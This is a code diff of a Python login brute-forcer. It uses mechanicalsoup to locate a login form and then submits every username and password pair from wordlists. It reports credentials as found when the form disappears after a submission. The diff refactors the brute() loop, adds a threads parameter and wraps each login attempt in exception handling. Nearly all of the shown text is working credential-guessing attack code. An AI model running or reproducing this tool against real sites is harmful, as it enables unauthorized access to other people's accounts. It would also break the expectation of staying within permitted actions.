@@ -1,4 +1,4 @@
-import re
+import re, mechanicalsoup
 
 def analysis(form):
    reTextControl = r"text\((.*)\)"
@@ -48,7 +48,7 @@ def check(url):
    try:
       browser.open(URL)
       # OPENING URL, DEBUG MSG HERE
-      result = core.getLoginForm(browser)
+      result = getLoginForm(browser)
    except Exception as error:
       # PRINT ERROR HERE
       result = False
@@ -56,7 +56,7 @@ def check(url):
       browser.close()
       return result
 
-def brute(url, userlist, passlist):
+def brute(url, userlist, passlist, threads = 16):
    check_result = check(url)
    if not check_result:
       print("[x] Get login form error")
@@ -66,18 +66,18 @@ def brute(url, userlist, passlist):
    for username in usrlist:
       for password in passlist:
          # CREATE NEW BROWSER FOR EACH LOGIN. THIS IS A MUST DO
-         browser = createBrowser()
-         browser.open(URL)
-         # FILL FORM WITH VALUES
-         browser.select_form(nr = formID)
-         browser[formUser] = username
-         browser[formPass] = password
-         # SUBMIT 
-         browser.submit_selected()
-         # check condition here
          try:
+            browser = createBrowser()
+            browser.open(URL)
+            # FILL FORM WITH VALUES
+            browser.select_form(nr = formID)
+            browser[formUser] = username
+            browser[formPass] = password
+            # SUBMIT 
+            browser.submit_selected()
+            # check condition here
             # HAS FORM
-            check_form = core.getLoginForm(browser)
+            check_form = getLoginForm(browser)
             if not check_form:
                print("Found: [%s:%s]" %(username, password))
                break
